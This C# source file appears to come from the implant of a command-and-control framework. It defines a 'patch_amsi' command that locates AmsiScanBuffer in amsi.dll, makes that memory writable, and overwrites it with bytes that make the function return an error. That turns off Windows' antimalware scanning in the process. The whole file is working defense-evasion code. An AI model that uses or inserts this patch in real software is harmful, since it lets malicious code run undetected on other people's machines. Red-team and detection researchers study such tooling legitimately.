using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Linq;
using System.Runtime.InteropServices;
using System.Security.Policy;
using System.Text;
using System.Threading.Tasks;
using Engineer.Extra;
using Engineer.Functions;
using Engineer.Models;

namespace Engineer.Commands
{
    internal class Patch_AMSI : EngineerCommand
    {
        public override string Name => "patch_amsi";

        public override async Task Execute(EngineerTask task)
        {
            try
            {                
                if(IntPtr.Size == 8)
                {
                    byte[] patch = { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3 };
                    Patch( patch);
                }
                else
                {
                    byte[] patch = { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3 };
                    Patch( patch);
                }



                Tasking.FillTaskResults("AMSI Patched with D/Invoke",task,EngTaskStatus.Complete,TaskResponseType.String);
            }
            catch (Exception e)
            {
                var error = "error: " + "[!] {patch failed}" + e.Message;
                Tasking.FillTaskResults(error,task,EngTaskStatus.Failed,TaskResponseType.String);
            }
        }
        
        private static void Patch( byte[] patch)
        {
            //get the address of the function
            IntPtr ModuleBase = reprobate.GetPebLdrModuleEntry("amsi.dll");
            IntPtr functionAddress = reprobate.GetExportAddress(ModuleBase, "AmsiScanBuffer");

            //make the address writable, I wanted to use getSyscallStub but with NtAllocateVirtualMemory and NtPtotect being called fro ma ammped version of the dll, its kind of pointless to use the syscall stub.
            IntPtr patchLength = (IntPtr)patch.Length;
            uint oldProtect =  h_reprobate.NtProtectVirtualMemory(Process.GetCurrentProcess().Handle, ref functionAddress, ref patchLength, WinAPIs.Kernel32.PAGE_READWRITE);

            // Patch function
            Marshal.Copy(patch, 0, functionAddress, patch.Length);

            // Restore memory permissions
            uint newProtect = new uint();
            h_reprobate.NtProtectVirtualMemory(Process.GetCurrentProcess().Handle, ref functionAddress, ref patchLength, oldProtect);

        }
    }
}
